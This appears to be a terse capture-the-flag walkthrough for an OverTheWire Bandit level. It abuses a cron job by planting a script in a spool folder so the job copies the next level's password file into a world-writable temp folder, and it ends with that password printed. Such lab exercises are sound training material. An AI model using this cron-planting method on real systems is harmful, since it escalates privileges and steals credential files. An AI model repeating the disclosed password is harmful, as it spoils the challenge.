cd /etc/cron.d
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/myscripts
chmod 777 /tmp/myscripts
cd /tmp/myscripts
#create a script called myscript.sh with
#!/bin/bash
#cat /etc/bandit_pass/bandit24 >> /tmp/myscripts/password
chmod 777 myscript.sh
cp myscript.sh /var/spool/bandit24/
#wait
cat password
#UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ